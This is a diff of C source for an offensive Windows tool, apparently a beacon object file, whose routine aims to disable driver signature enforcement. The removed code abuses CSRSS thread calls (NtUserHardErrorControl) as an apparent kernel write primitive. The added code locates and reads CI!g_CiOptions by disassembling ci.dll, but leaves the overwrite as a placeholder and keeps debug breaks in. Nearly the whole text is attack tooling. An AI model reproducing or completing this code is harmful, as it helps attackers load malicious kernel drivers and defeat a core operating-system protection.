@@ -16,87 +16,167 @@
  *
  * Purpose:
  *
- * Disables driver signing enforcement for
- * the system, allowing an arbitrary user
- * to load drivers.
- *
- * Runs within CSRSS and executes the sys
- * call.
+ * Attempts to use the elevated thread to
+ * disable driver signing enforcement.
  *
 **/
 
-D_SEC( C ) VOID WINAPI DsePatch( PVOID Parameter )
+D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api ) 
 {
-	ULONG				Len = sizeof( SYSTEM_HANDLE_INFORMATION );
-	PVOID				Obf = NULL;
-	PVOID				Thd = NULL;
-	PVOID				Mgr = NULL;
-	PSYSTEM_HANDLE_INFORMATION	Sys = NULL;
+	ULONG				Opt = 0;
+	ULONG				Fir = 0;
+	ULONG				Rel = 0;
+	ULONG				Off = 0;
+	PBYTE				Ptr = NULL;
+	PVOID				Map = NULL;
+	PCHAR				Str = NULL;
+	ULONG				Len = 0;
+	PSYSTEM_MODULE_INFORMATION 	Inf = NULL;
 
-	API				Api;
-	CLIENT_ID			Cid;
-	LARGE_INTEGER			Prm;
-	OBJECT_ATTRIBUTES		Obj;
-	USERTHREAD_USEDESKTOP		Usr;
+	hde64s				Hde;
+	RTL_OSVERSIONINFOW		Ver;
 
-	RtlSecureZeroMemory( &Api, sizeof( Api ) );
-	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
-	RtlSecureZeroMemory( &Prm, sizeof( Prm ) );
-	RtlSecureZeroMemory( &Obj, sizeof( Obj ) );
-	RtlSecureZeroMemory( &Usr, sizeof( Usr ) );
+	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
+	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );
+	Ver.dwOSVersionInfoSize = sizeof( Ver );
 
-	Api.NtQuerySystemInformation = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYSYSTEMINFORMATION );
-	Api.RtlReAllocateHeap        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
-	Api.NtQueueApcThread         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUEUEAPCTHREAD );
-	Api.RtlAllocateHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
-	Api.RtlGetVersion            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLGETVERSION );
-	Api.NtOpenThread             = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENTHREAD );
-	Api.RtlFreeHeap		     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
-	Api.DbgPrint		     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_DBGPRINT );
-	Api.NtClose                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );
+	Api->RtlGetVersion( &Ver );
 
-	Obj.Length        = sizeof( OBJECT_ATTRIBUTES );
-	Cid.UniqueThread  = ( ( PCLIENT_ID ) Parameter )->UniqueThread;
-	Cid.UniqueProcess = ( ( PCLIENT_ID ) Parameter )->UniqueProcess;
+	/* Get size! */
+	if ( !( Api->NtQuerySystemInformation( SystemModuleInformation, NULL, 0, &Len ) ) ) {
+		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get module info length." ) ) );
+		goto Leave;
+	};
 
-	if ( ! Api.NtOpenThread( &Thd, THREAD_ALL_ACCESS, &Obj, &Cid ) ) {
-		/* Create the initial allocation */
-		Mgr = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;
-		Sys = Api.RtlAllocateHeap( Mgr, HEAP_ZERO_MEMORY, Len );
+	/* Get ptrs! */
+	if ( !( Inf = Api->LocalAlloc( LPTR, Len ) ) ) {
+		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not allocate module info." ) ) );
+		goto Leave;
+	};
 
-		/* Try to allocate the correct buffer size to get the lenght */
-		while ( Api.NtQuerySystemInformation( SystemHandleInformation, Sys, Len, NULL ) == STATUS_INFO_LENGTH_MISMATCH ) {
-			Sys = Api.RtlReAllocateHeap( Mgr, HEAP_ZERO_MEMORY, Sys, Len += sizeof( SYSTEM_HANDLE_INFORMATION ) );
-			
-			/* :( abort */
-			if ( ! Sys ) {
-				break;
-			};
-		};
+	/* Get info! */
+	if ( !( Api->NtQuerySystemInformation( SystemModuleInformation, Inf, Len, NULL ) >= 0 ) ) {
+		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get module info." ) ) );
+		goto Leave;
+	};
 
-		/* Good? Enum! */
-		if ( Sys != NULL ) {
-			for ( INT Idx = 0 ; Idx < Sys->NumberOfHandles ; ++Idx ) {
-				/* Is our process? */
-				if ( Sys->Handles[ Idx ].UniqueProcessId == ( ( USHORT )( NtCurrentTeb()->ClientId.UniqueProcess ) ) ) {
-					/* Is our handle? */
-					if ( Sys->Handles[ Idx ].HandleValue == ( ( USHORT )( Thd ) ) ) {
-						/* Object Address! */
-						Obf = C_PTR( Sys->Handles[ Idx ].Object );
-						break;
+	/* Enumerate modules! */
+	for ( ULONG Idx = 0 ; Idx < Inf->Count ; ++Idx ) {
+		Str = C_PTR( U_PTR( Inf->Module[ Idx ].FullPathName ) + Inf->Module[ Idx ].OffsetToFileName );
+
+		/* Is CI.DLL? */
+		if ( HashString( Str, 0 ) == H_STR_CI ) {
+
+			Map = Api->LoadLibraryEx( C_PTR( G_SYM( "C:\\Windows\\System32\\ci.dll" ) ), NULL, DONT_RESOLVE_DLL_REFERENCES );
+
+			if ( Map != NULL )
+			{
+				Ptr = PeGetFuncEat( Map, H_STR_CIINITIALIZE );
+				Rel = 0;
+				Off = 0;
+
+				if ( Ptr != NULL )
+				{
+					if ( Ver.dwBuildNumber < 16299 ) {
+						/* Before RS3! */
+						do 
+						{
+							hde64_disasm( &Ptr[ Off ], &Hde );
+
+							if ( Hde.flags & F_ERROR ) {
+								break;
+							};
+
+							if ( Hde.len == 5 ) {
+								if ( Ptr[ Off ] == 0xe9 ) {
+									Rel = *( LONG * )( U_PTR( Ptr ) + Off + 1 );
+									__debugbreak();
+									break;
+								};
+							};
+							Off += Hde.len;
+						} while ( Off < 256 );
+					} else {
+						do
+						{
+							hde64_disasm( &Ptr[ Off ], &Hde );
+
+							if ( Hde.flags & F_ERROR ) {
+								break;
+							};
+
+							if ( Hde.len == 5 ) {
+								if ( Ptr[ Off ] == 0xe8 ) { 
+									if ( Fir != 1 ) {
+										Fir = 1; continue;
+									};
+									Rel = *( LONG * )( U_PTR( Ptr ) + Off + 1 );
+									__debugbreak();
+									break;
+								};
+							};
+							Off += Hde.len;
+						} while ( Off < 256 );
 					};
-				};
-			};
 
-			/* Good! */
-			if ( Obf != NULL ) {
-				if ( ! NtUserSetInformationThread( ( ( HANDLE ) - 2 ), 7, &Usr, sizeof( Usr ) ) ) {
-					Usr.Restore.pDeskRestore = C_PTR( U_PTR( U_PTR( U_PTR( Obf ) + 0x232 ) + 0x30 ) );
-					NtUserHardErrorControl( 6, ( ( HANDLE ) - 2 ), &Usr.Restore );
+					if ( ! Rel ) {
+						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not find CipInitialize." ) ) );
+						goto Leave;
+					};
+
+					Ptr = C_PTR( U_PTR( Ptr ) + U_PTR( Off ) + U_PTR( Hde.len ) + U_PTR( Rel ) );
+					Rel = 0;
+					Off = 0;
+
+					do 
+					{
+						hde64_disasm( &Ptr[ Off ], &Hde );
+
+						if ( Hde.flags & F_ERROR ) {
+							break;
+						};
+
+						if ( Hde.len == 6 ) {
+							if ( Ptr[ Off ] == 0x89 && Ptr[ Off + 1 ] == 0x0d ) {
+								Rel = *( ULONG * )( Ptr + Off + 2 );
+								break;
+							};
+						};
+						Off += Hde.len;
+					} while ( Off < 256 );
+
+					if ( ! Rel ) {
+						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not find g_CiOptions" ) ) );
+						goto Leave;
+					};
+
+					Ptr = C_PTR( U_PTR( Ptr ) + U_PTR( Off ) + U_PTR( Hde.len ) + U_PTR( Rel ) );
+					Ptr = C_PTR( U_PTR( Ptr ) - U_PTR( Map ) + U_PTR( Inf->Module[ Idx ].ImageBase ) );
+
+					if ( ! Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Ptr, &Opt, sizeof( Opt ), NULL ) ) {
+						BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "CI!g_CiOptions @ 0x%p\n" ) ), Ptr );
+						BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "CI!g_CiOptions = 0x%x\n" ) ), Opt );
+
+						/* Set and reset! */
+					} else {
+						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read g_CiOptions" ) ) );
+						goto Leave;
+					};
+				} else {
+					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not find CiInitialize" ) ) );
+					goto Leave;
 				};
+			} else {
+				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not load ci.dll" ) ) );
+				goto Leave;
 			};
-			Api.RtlFreeHeap( Mgr, 0, Sys );
 		};
-		Api.NtClose( Thd );
+	};
+Leave:
+	if ( Inf != NULL ) {
+		Api->LocalFree( Inf );
+	};
+	if ( Map != NULL ) {
+		Api->FreeLibrary( Map );
 	};
 };
